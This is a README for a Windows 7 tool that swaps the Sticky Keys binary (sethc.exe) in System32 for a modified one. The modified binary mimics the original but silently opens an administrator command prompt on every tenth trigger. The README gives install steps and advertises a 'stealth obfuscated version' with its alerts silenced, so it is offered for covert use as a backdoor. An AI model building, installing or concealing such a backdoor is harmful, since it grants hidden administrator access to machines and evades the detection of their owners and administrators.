# Sethc-Admin-Exploit-Hider-Windows-7 

## What it does:
* takes the place of sethc.exe in Folder Windows/System32 
* acts like the original sethc, by starting the original sethc with its original dialog
* runs a background task which listens for the amount of runs (how often the 5-times shift function ran)
* every time (counter modulo 10) is true, it starts one cmd window with admin rights. (Counter = 1 initially)

## Setup: 
* Backup your original sethc.exe
* Replace C:/Windows/system32/sethc.exe with the modded sethc from this repository
* Optional: copy your backed up sethc.exe to "C:\Windows\SysWOW64\sethc.exe" if you want the original sethc to appear on each 5-times shift event


## Properties:
> Script immediately runs sethc.exe from "C:\Windows\SysWOW64\sethc.exe" (if that step of setup was done), which can be changed.

> Script runs "C:\Windows\System32\cmd.exe" on success, can also be changed.

> Script alerts the current counter-value, can be changed or hidden.

## Variants:
* One normal source code version
* one stealth obfuscated version, where alerts are silenced

## Comment:
I haven't tried if it works in other windows versions. if it does, just leave a comment.
